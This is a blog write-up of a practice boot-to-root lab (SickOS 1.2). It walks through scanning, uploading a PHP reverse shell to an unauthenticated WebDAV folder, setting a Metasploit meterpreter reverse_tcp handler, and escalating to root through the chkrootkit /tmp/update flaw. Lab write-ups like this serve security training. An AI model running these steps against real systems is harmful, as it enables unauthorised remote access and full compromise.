+++
menu = "posts"
date = "2016-12-20T23:45:50-05:00"
title = "B2R: SickOSv1.2"

+++



## Executive Summary
This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be
executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to
explore the system for additional vulnerabilities which could lead to a full compromise. During the
exploration, an outdated version of `chkrootkit` was found. By exploiting a known vulnerability in the way
`chkrootkit` parses arguments, an attacker could create a malicious file that would later be run by
`chkrootkit` as a fully privileged user.

## Tools used
  - nmap - discovery
  - uniscan - web application scanner
  - metasploit - exploit framework
  - msfvenom - payload generation
  - local-linux-enum script - enumeration

## Proof of Concept

In order to cut down on typing, once the IP of the victim computer is discovered, it can be added to the
`/etc/hosts`.

~~~bash.prettyprint
echo "192.168.1.188 vm" >> /etc/hosts
~~~

We begin with scanning the victim's machine and find ports 80 and 22.

~~~bash.prettyprint
❯❯ nmap -p - -A vm | tee nmap.scan
~~~

![](https://i.imgur.com/jQr872J.png)


Navigating to the page and checking its source code reveals nothing

![](https://i.imgur.com/1Oigcfa.png)

Running `uniscan`, a folder named `test` is discovered

~~~bash.prettyprint
❯❯ uniscan -qweds -u http://vm/ 
~~~

![](https://i.imgur.com/wU5Wp2v.png)

The listing appeared to be empty but further examination of the `/test` path revealed that it responded to
more than just HTTP methods. `COPY` and `MOVE` seemed to indicate WebDAV.

~~~bash.prettyprint
❯❯ curl -vX OPTIONS vm/test
~~~

![](https://i.imgur.com/6GKZJbc.png)

This path requires no authentication and thus allows attackers to upload files to the web server. 

![](https://i.imgur.com/gSzuoHZ.png)


Verifying successful upload:

![](https://i.imgur.com/CpTqKyO.png)

Having uploaded the reverse shell, the Meterpreter handler is constructed

~~~bash.prettyprint
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 80
run -j
~~~

...and the payload is activated.

~~~bash.prettyprint
curl http://vm/test/sshhh.php
~~~


![](https://i.imgur.com/XQ3a9Q4.png)

Once a shell has been established on the system, an enumeration script reveals what additional
vulnerabilities might lead to a full compromise.


The installed version of `chkrootkit` is outdated and vulnerable to a code execution exploit.

![](https://i.imgur.com/EJSijYp.png)

The ExploitDB gives the following description:

![](https://i.imgur.com/uVIlbic.png)

Using Metasploit, we create another handler and payload, using the `chkrootkit` module. This module will
create/overwrite the `/tmp/update` file with the reverse tcp shell of your choosing. The next time
`chkrootkit` is run, this update file will connect back to the attacker computer designated in the payload.

![](https://i.imgur.com/9GKQfrW.png)
